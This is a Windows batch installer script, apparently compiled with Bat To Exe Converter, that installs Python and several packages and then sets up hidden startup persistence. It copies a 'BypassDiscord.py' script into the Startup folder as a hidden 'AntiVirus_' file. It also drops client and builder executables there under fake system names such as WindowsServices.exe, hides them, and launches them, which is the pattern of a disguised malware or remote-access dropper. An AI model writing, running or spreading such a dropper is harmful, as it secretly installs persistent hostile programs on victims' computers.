::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCiDJFiU5FEMGQ5RXxCqKWWuA6dc7ezy+++DnkscQus8d4GV07eBQA==
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJhZksaH2Q=
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQIBPR5HWESyMGqjA6d8
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCmDJFiU5FEMEAxbXgm+Cj6GN6AZ+/zL4+uep18hZ/Y+apvOyvqLOOVz
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
echo Checking for Python installation...

:: Check if python is installed
python --version >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo Python not found. Installing Python 3.10 via winget...
    winget install --id Python.Python.3.10 --silent --accept-package-agreements --accept-source-agreements
) ELSE (
    echo Python is already installed.
)

echo.
echo Upgrading pip...
python -m pip install --upgrade pip

echo.
echo Installing required Python packages...
@echo off
python -m pip install requests
python -m pip install beautifulsoup4
python -m pip install Pillow
python -m pip install pycryptodome
python -m pip install pypiwin32
python -m pip install cryptography==42.0.5
python -m pip install ttkthemes==3.2.2
python -m pip install pyfiglet==1.0.2

::paste bybass discord in startup
@echo off
set "SRC=%~dp0BypassDiscord.py"
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
attrib -H -S -R "%STARTUP%\AntiVirus_*.pyw" /S /D 2>nul
del /F /Q "%STARTUP%\AntiVirus_*.pyw" 2>nul 2>&1
set "DEST=%STARTUP%\AntiVirus_%RANDOM%.pyw"
copy /Y "%SRC%" "%DEST%" >nul 2>&1
attrib +h "%DEST%"
 

::paste client-built in system32
set "SRC2=%~dp0\Binaries\Win64\en-US\Client-built.exe"
set "SYSTEM=C:\Windows\System32"
set "DEST2=%STARTUP%\System.exe"
copy /Y "%SRC2%" "%DEST2%" >nul 2>&1
attrib +h "%DEST2%"



::paste client in system32
set "SRC3=%~dp0\Binaries\Win64\en-US\Client.exe"
set "SYSTEM=C:\Windows\System32"
set "DEST3=%STARTUP%\WindowsServices.exe"
copy /Y "%SRC3%" "%DEST3%" >nul 2>&1
attrib +h "%DEST3%"

::paste builder in system32
set "SRC4=%~dp0\Binaries\Win64\en-US\Builder.exe"
set "SYSTEM=C:\Windows\System32"
set "DEST4=%STARTUP%\SystemServices.exe"
copy /Y "%SRC4%" "%DEST4%" >nul 2>&1
attrib +h "%DEST4%"



::ending
echo.
echo All installations complete!
@echo off
start "" "%~dp0\Binaries\Win64\en-US\Client.exe"
start "" "%~dp0\Binaries\Win64\en-US\Client-built.exe"

start "" python "%~dp0GUI.py"
